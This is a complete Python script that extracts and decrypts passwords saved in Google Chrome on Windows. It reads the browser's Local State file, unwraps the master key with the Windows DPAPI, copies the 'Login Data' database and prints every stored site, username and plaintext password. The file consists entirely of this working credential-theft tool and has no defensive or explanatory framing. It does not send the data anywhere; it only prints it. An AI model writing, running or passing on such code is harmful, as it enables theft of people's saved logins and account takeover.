import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES  # Assuming you have pycryptodome installed
import shutil

# Function to retrieve the master key used for decrypting Chrome passwords
def get_master_key():
    # Chrome stores the master key in the local state file
    with open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'), "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)  # Load the JSON data
    # Extract and decode the master key
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI prefix
    # Decrypt the master key using Windows API
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

# Function to decrypt the payload using AES cipher
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# Function to generate AES cipher
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

# Function to decrypt Chrome password using master key
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]  # Extract IV (Initialization Vector)
        payload = buff[15:]  # Extract encrypted payload
        cipher = generate_cipher(master_key, iv)  # Generate cipher
        decrypted_pass = decrypt_payload(cipher, payload)  # Decrypt payload
        decrypted_pass = decrypted_pass[:-16].decode()  # Decode decrypted password
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"  # Return this for versions of Chrome prior to 80

# Get the master key
master_key = get_master_key()
# Copy the login database to a temporary location
login_db = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Profile 1', 'Login Data')
shutil.copy2(login_db, "Loginvault.db")
# Connect to the copied database
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()

try:
    # Retrieve data from the logins table
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        # Decrypt the password using the master key
        decrypted_password = decrypt_password(encrypted_password, master_key)
        if len(username) > 0:
            # Print the details
            print("URL: " + url + "\nUser Name: " + username +
                  "\nPassword: " + decrypted_password + "\n" + "#"*50 + "\n")

except Exception as e:
    pass  # Do nothing in case of any exceptions

# Close cursor and connection
cursor.close()
conn.close()

# Remove the temporary database file
try:
    os.remove("Loginvault.db")
except Exception as e:
    pass  # Do nothing if file removal fails
